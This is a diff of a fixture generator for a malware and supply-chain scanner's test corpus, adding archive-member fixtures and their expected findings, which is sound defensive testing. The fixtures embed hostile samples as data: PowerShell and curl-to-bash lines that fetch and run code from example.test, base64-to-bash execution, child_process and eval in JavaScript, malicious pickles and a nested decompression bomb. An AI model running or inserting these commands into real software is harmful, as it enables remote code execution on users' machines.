@@ -34,6 +34,7 @@ PYREQ_DIR  = os.path.join(CORPUS_DIR, 'python_requirements')
 NUGET_DIR  = os.path.join(CORPUS_DIR, 'nuget')
 MODEL_DIR  = os.path.join(CORPUS_DIR, 'model')
 ARCHIVE_DIR = os.path.join(CORPUS_DIR, 'archive')
+ARCMEM_DIR  = os.path.join(CORPUS_DIR, 'archive_member')
 PYRULES_DIR = os.path.join(CORPUS_DIR, 'python_rules')
 VBA_DIR     = os.path.join(CORPUS_DIR, 'vba')
 os.makedirs(PYTHON_DIR, exist_ok=True)
@@ -54,6 +55,7 @@ for sub in ('clean', 'vulnerable', 'collide/a', 'collide/b', 'ambiguous', 'neste
     os.makedirs(os.path.join(NUGET_DIR, sub), exist_ok=True)
 os.makedirs(MODEL_DIR, exist_ok=True)
 os.makedirs(ARCHIVE_DIR, exist_ok=True)
+os.makedirs(ARCMEM_DIR, exist_ok=True)
 os.makedirs(PYRULES_DIR, exist_ok=True)
 os.makedirs(VBA_DIR, exist_ok=True)
 
@@ -872,6 +874,111 @@ with zipfile.ZipFile(buf, 'w') as z:
 write(os.path.join(ARCHIVE_DIR, 'traversal.zip'), buf.getvalue())
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Recursive archive-member dispatch fixtures (issue #31).
+# ─────────────────────────────────────────────────────────────────────────────
+# A. Disguised script + real scripts inside a plain zip. payload.txt has NO
+#    shebang and an innocent extension — only content-first classification
+#    (New-Unit, reused as-is for archive members) catches it.
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('notes/payload.txt', FIXED_ZIP_DT),
+        "[CmdletBinding()]\nparam($Url)\n"
+        "$wc = New-Object System.Net.WebClient\n"
+        "Invoke-Expression ($wc.DownloadString('http://example.test/p'))\n"
+        "Write-Host 'done'\n")
+    z.writestr(zipfile.ZipInfo('scripts/tool.sh', FIXED_ZIP_DT),
+        '#!/bin/bash\ncurl https://example.test/install.sh | bash\n')
+write(os.path.join(ARCMEM_DIR, 'disguised_and_scripts.zip'), buf.getvalue())
+
+# B. .js with no package.json anywhere in the archive — must still be scanned
+#    (NpmScan's loose-unit path does not require a manifest).
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('app.js', FIXED_ZIP_DT),
+        "const cp = require('child_process');\n"
+        "cp.exec('whoami');\n"
+        "eval(globalThis.atob('cGF5bG9hZA=='));\n")
+write(os.path.join(ARCMEM_DIR, 'js_no_pkg.zip'), buf.getvalue())
+
+# C. Two levels of real nesting: outer.zip -> inner.zip -> deep/risky.sh.
+#    Proves recursion actually opens and scans a nested archive's CONTENT
+#    (not just flags that nesting exists — the existing archive/nested.zip
+#    fixture's inner archive holds only inert text).
+_inner_risky = io.BytesIO()
+with zipfile.ZipFile(_inner_risky, 'w', zipfile.ZIP_DEFLATED) as iz:
+    iz.writestr(zipfile.ZipInfo('deep/risky.sh', FIXED_ZIP_DT),
+        '#!/bin/bash\necho "cGF5bG9hZAo=" | base64 -d | bash\n')
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('inner.zip', FIXED_ZIP_DT), _inner_risky.getvalue())
+write(os.path.join(ARCMEM_DIR, 'two_level_nested.zip'), buf.getvalue())
+
+# D. A nested decompression bomb — proves zip-slip/bomb/symlink hardening runs
+#    before EVERY extraction, including a nested one, not just the top level.
+_inner_bomb = io.BytesIO()
+with zipfile.ZipFile(_inner_bomb, 'w') as iz:
+    iz.writestr(zipfile.ZipInfo('bomb.bin', FIXED_ZIP_DT),
+                b'\x00' * (16 * 1024 * 1024), zipfile.ZIP_DEFLATED)
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('inner_bomb.zip', FIXED_ZIP_DT), _inner_bomb.getvalue())
+write(os.path.join(ARCMEM_DIR, 'nested_bomb.zip'), buf.getvalue())
+
+# E. npm lifecycle hook + a malicious pickle in ONE archive — proves member
+#    dispatch produces exactly one finding per (member, rule), not duplicated
+#    by a parent-level whole-tree walk (the old NpmScan/PickleOpcodeScan
+#    'archive' branches this PR removes).
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('pkg/package.json', FIXED_ZIP_DT),
+        json.dumps(_malicious_pkg, indent=2))
+    z.writestr(zipfile.ZipInfo('models/bad.pkl', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
+write(os.path.join(ARCMEM_DIR, 'no_dupes.zip'), buf.getvalue())
+
+# F. A single, clean shell-script member — dedicated fixture for the
+#    disabled-analyzer aggregate-coverage test (isolated from any other
+#    member so the aggregate finding's count is unambiguous).
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('run.sh', FIXED_ZIP_DT), '#!/bin/bash\necho hello\n')
+write(os.path.join(ARCMEM_DIR, 'shell_only.zip'), buf.getvalue())
+
+# G. A real wheel (semantic container) embedded inside a generic zip (review
+#    follow-up on #37, P4 review). Proves the wheel's EXPANDED content size
+#    (once extracted), not just its compressed size as it sat inside the
+#    parent zip, gets charged to the shared archive-tree budget.
+with open(os.path.join(PYTHON_DIR, 'clean_pkg-1.0-py3-none-any.whl'), 'rb') as _f:
+    _clean_wheel_bytes = _f.read()
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('bundled.whl', FIXED_ZIP_DT), _clean_wheel_bytes)
+write(os.path.join(ARCMEM_DIR, 'nested_wheel.zip'), buf.getvalue())
+
+# H. A malicious pickle stored under a .bin extension, not .pkl (review
+#    follow-up on #37, P4 review). PickleOpcodeScan's old whole-archive walk
+#    covered .bin/.h5/.hdf5/.pb/.onnx/.npy/.npz; recursive member dispatch
+#    only routes what Classify.ps1 recognizes as 'model' -- these extensions
+#    needed to be added there too, or this is silently missed.
+buf = io.BytesIO()
+with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
+    z.writestr(zipfile.ZipInfo('model.bin', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
+write(os.path.join(ARCMEM_DIR, 'malicious_bin.zip'), buf.getvalue())
+
+# I. A multi-member gzip tarball with deterministic, known per-entry sizes
+#    (review follow-up on #37, third review round). Proves tar extraction is
+#    now STREAMED with per-entry budget enforcement -- unlike the previous
+#    bulk `tar -xzf`/tarfile.extractall(), which wrote every entry before
+#    returning control, a tight budget must leave LATER entries unextracted
+#    while EARLIER ones (within budget) are still written.
+_multi_tar = os.path.join(ARCMEM_DIR, 'multi_member.tgz')
+with _tarfile.open(_multi_tar, 'w:gz') as tf:
+    for _i, _size in enumerate([1000, 2000, 3000], start=1):
+        _data = (str(_i).encode() * _size)[:_size]
+        _info = _tarfile.TarInfo(f'file{_i}.bin'); _info.size = len(_data); _info.mtime = FIXED_EPOCH
+        tf.addfile(_info, io.BytesIO(_data))
+print(f'  wrote {_multi_tar}')
+
+# ─────────────────────────────────────────────────────────────────────────────
 # VB-family fixtures (issue #25) — exported VBA modules and VBScript.
 # Static text only: nothing here is ever executed, and the "payloads" reference
 # TEST-NET-2 (198.51.100.0/24, RFC 5737) and .test names, which are unroutable.
@@ -1039,6 +1146,15 @@ manifest = {
         "archive/symlink.zip":   {"expectFinding": "MTS-EXTRACT-SYMLINK"},
         "archive/nested.zip":    {"expectFinding": "MTS-EXTRACT-NESTED"},
         "archive/traversal.zip": {"expectFinding": "MTS-EXTRACT-TRAVERSAL", "blocked": True},
+        "archive_member/disguised_and_scripts.zip": {"expectFinding": "MTS-DISGUISE-002"},
+        "archive_member/js_no_pkg.zip":              {"expectFinding": "NPM-JS-CHILD-PROCESS"},
+        "archive_member/two_level_nested.zip":       {"expectFinding": "SHELL-B64-EXEC"},
+        "archive_member/nested_bomb.zip":             {"expectFinding": "MTS-EXTRACT-BOMB"},
+        "archive_member/no_dupes.zip":                {"expectFinding": "NPM-LIFECYCLE-SCRIPT"},
+        "archive_member/shell_only.zip":              {"expectHazard": False},
+        "archive_member/nested_wheel.zip":            {"expectHazard": False},
+        "archive_member/malicious_bin.zip":           {"expectFinding": "PICKLE-REDUCE"},
+        "archive_member/multi_member.tgz":            {"expectHazard": False},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
